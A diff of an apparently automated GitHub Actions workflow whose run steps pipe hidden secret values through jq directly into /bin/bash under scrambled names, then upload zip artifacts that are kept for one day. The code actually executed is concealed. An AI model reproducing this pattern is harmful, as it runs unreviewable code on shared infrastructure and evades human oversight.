@@ -1,31 +1,24 @@
 name: chuanzhangqinxian
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '15 3/6 * * *'
-jobs:  # 14169
+    - cron: '33 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: chuanzhangqinxian
         env:
-          jweo62: ${{ secrets.jweo62 }}
+          i2814: ${{ secrets.i2814 }}
         run: |
-          echo $jweo62 | jq -r .gwlr13 | /bin/bash
-          echo $wm21538 | jq -r .cbc75 | /bin/bash
-          echo $mrnil6 | jq -r .wtf59898 | /bin/bash
-          echo $uwf9 | jq -r .elunb39213 | /bin/bash
-          echo $etbe4608 | jq -r .ik4 | /bin/bash
-          echo $caw1 | jq -r .rbhtl70 | /bin/bash
-          echo $dvyqx3 | jq -r .g627 | /bin/bash
-          echo $iwdu06 | jq -r .cp85 | /bin/bash
-          echo $i01 | jq -r .wupa9 | /bin/bash
-          echo $j63822 | jq -r .fwscu7750 | /bin/bash
-          echo $aeh0 | jq -r .mt75 | /bin/bash
-          echo $gyhe53 | jq -r .twyc79212 | /bin/bash
-          echo $mhz07 | jq -r .wlq758 | /bin/bash
-          echo $cey62 | jq -r .imuj45407 | /bin/bash
-          echo $g60 | jq -r .hsr2573 | /bin/bash
+          printf '%s' "$i2814" | jq -r .nfnh10 | /bin/bash
+          echo $kucj169 | jq -r .eg22242 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: RDk3Do5O
+          path: "*.zip"
+          retention-days: 1
